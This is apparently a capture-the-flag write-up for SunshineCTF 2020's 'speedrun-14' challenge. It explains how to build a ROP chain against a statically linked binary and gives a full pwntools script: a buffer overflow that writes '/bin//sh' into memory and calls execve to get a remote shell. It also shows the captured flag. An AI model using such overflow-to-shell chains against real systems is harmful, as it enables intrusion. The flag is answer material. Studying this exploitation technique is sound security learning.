# speedrun-14

## Task

nc chal.2020.sunshinectf.org 30014

File: chall_14

Tags: statically linked, binary exploitation, rop chain

## Solution

Now we have a statically linked binary with lots of functions. Lots of ROP gadgets!

Took me a while to figure this out.

After overflowing the buffer we need to insert our first gagdet.

Final result has to be to call an address where `syscall` is used.

Before that we need to:

  - set `rax` to `59` for the `execve` syscall.
  - set `rdi` to an address where `/bin//sh` is stored (first parameter)
  - set `rsi` to `0` (second parameter)
  - set `rdx` to `0` (third parameter)

But there is no `/bin/sh` or `/bin//sh` in the binary!

It's also explained here: https://github.com/guyinatuxedo/ctf/tree/master/defconquals2019/speedrun/s1

Since the file isn't an PIE we don't need a leak for the gadgets and can write to a memory region and use a `mov [rXx], rXx` to load the contents of a register into the address specified.

We use `dumprop` in gdb with peda to get the full list.

We find this: `0x484dac: mov [rax],rdx; add rsp,0x8; ret`

So we need to pop `/bin//sh` from the stack into `rdx` and `0x6b6000` into rax. Our string will be at that location. We just need additional 8 bytes after that because `0x8` is added to our `rsp`.

```bash
$ pmap -x $(pgrep chall_14)
PID:   chall_14
Address           Kbytes     RSS   Dirty Mode  Mapping
0000000000400000     728     728     728 r-x-- chall_14
00000000006b6000      24      24      24 rw--- chall_14
```

We search for the rest of our gadgets and voila. Note here that I didn't use pwntools ROP gadget finder since it wasn't successfull:

```python
from pwn import *

POP_RDI = 0x400696
POP_RAX = 0x4158f4
POP_RSI = 0x410263
POD_RDX = 0x44c086
MOV_RDX = 0x484dac
SYSCALL = 0x474e35

payload  = 'A' * 104

payload += p64(POD_RDX)
payload += '/bin//sh'
payload += p64(POP_RAX)
payload += p64(0x6b6000)
payload += p64(MOV_RDX)
payload += p64(0) # because rsp is raised

payload += p64(POP_RAX)
payload += p64(59) # sys_execve
payload += p64(POP_RDI)
payload += p64(0x6b6000)
payload += p64(POP_RSI)
payload += p64(0)
payload += p64(POD_RDX)
payload += p64(0)
payload += p64(SYSCALL)

p = remote('chal.2020.sunshinectf.org', 30014)

p.sendline()
p.sendline(payload)
p.interactive()
```

Now we get our flag:

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30014: Done
[*] Switching to interactive mode
$ ls
chall_14
flag.txt
$ cat flag.txt
sun{hail-to-the-king-c24f18e818fb4986}
```
